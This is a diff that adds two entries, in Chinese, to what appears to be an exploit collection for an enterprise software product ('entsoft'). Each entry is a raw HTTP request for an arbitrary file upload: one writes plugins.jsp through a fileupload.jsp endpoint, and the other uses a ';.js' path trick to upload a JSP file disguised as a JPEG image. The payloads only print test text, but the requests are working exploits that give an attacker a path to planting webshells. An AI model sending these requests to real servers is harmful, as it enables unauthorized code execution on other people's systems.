@@ -201,3 +201,40 @@ func exploit(t, s string) string {
 }
 
 ```
+## 文件上传3
+```
+
+POST /entsoft_en/entereditor/jsp/fileupload.jsp?filename=plugins.jsp HTTP/1.1
+Host: xxxxxxxx
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0  uacq
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 8
+
+1111
+```
+
+## 文件上传4
+```
+
+POST /entsoft/CustomerAction.entphone;.js?method=loadFile HTTP/1.1
+Host: 
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0  uacq
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A
+Content-Length: 203
+
+------WebKitFormBoundarye8FPHsIAq9JN8j2A
+Content-Disposition: form-data; name="file";filename="as.jsp"
+Content-Type: image/jpeg
+
+<%out.print("test");%>
+------WebKitFormBoundarye8FPHsIAq9JN8j2A--
+```
